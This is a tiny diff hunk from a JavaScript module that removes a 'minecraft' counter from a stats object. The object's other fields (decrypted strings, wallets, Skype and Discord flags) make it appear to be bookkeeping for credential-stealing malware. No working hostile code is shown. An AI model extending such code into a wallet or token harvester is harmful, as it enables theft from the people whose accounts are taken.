@@ -10,7 +10,6 @@ module.exports = (client) => {
         decrypted_strings: 0,
 
         wallets: 0,
-        minecraft: 0,
 
         skype: false,
         discord: false,
